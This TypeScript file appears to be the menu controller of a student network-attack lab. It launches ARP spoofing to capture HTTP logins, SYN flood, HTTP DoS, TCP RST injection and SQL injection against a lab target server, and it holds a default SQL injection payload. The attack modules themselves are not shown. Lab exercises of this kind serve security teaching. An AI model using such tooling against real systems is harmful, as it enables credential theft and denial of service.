import readline from 'node:readline';
import { inspectTargetContract } from './attacks/recon.attack.js';
import { toggleArpSpoof } from './attacks/mitm.attack.js';
import { startHttpDosAttack, startSynFloodAttack } from './attacks/dos.attack.js';
import { runTcpRstInjection } from './attacks/tcp_rst.attack.js';
import { runSqlInjectionAttack } from './attacks/sqli.attack.js';
import { processes } from './services/process.service.js';

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const ask = (question: string) => new Promise<string>(resolve => rl.question(question, resolve));

console.log('=== PBL4 - ATTACKER CONTROLLER CỦA TRÍ ===');
console.log('Chỉ cho phép Client 172.20.0.10 và Target Server 172.20.0.20 trong cyber_net.');

function printMenu() {
  console.log('\n1. Khảo sát Target Server');
  console.log('2. Bật ARP Spoofing và bắt HTTP login');
  console.log('3. Chạy TCP SYN Flood');
  console.log('4. Chạy HTTP DoS 50 request/giây');
  console.log('5. Chạy TCP RST Injection');
  console.log('6. Chạy SQL Injection');
  console.log('7. Xem kịch bản đang chạy');
  console.log('8. Dừng tất cả kịch bản');
  console.log('9. Thoát');
}

async function menu(): Promise<void> {
  printMenu();
  const choice = (await ask('Chọn kịch bản (1-9): ')).trim();

  try {
    if (choice === '1') {
      console.log(await inspectTargetContract());
    } else if (choice === '2') {
      console.log(await toggleArpSpoof(true));
    } else if (choice === '3') {
      console.log(await startSynFloodAttack());
    } else if (choice === '4') {
      console.log(await startHttpDosAttack());
    } else if (choice === '5') {
      console.log(await runTcpRstInjection());
    } else if (choice === '6') {
      const payload = (await ask("Payload (mặc định: ' OR '1'='1' --): ")).trim() || undefined;
      console.log(await runSqlInjectionAttack(undefined, payload));
    } else if (choice === '7') {
      console.table(processes.snapshot());
    } else if (choice === '8') {
      processes.stopAll();
      console.log('Đã dừng tất cả kịch bản.');
    } else if (choice === '9') {
      processes.stopAll();
      rl.close();
      return;
    } else {
      console.log('Lựa chọn không hợp lệ.');
    }
  } catch (error) {
    console.error((error as Error).message);
  }

  await menu();
}

void menu();
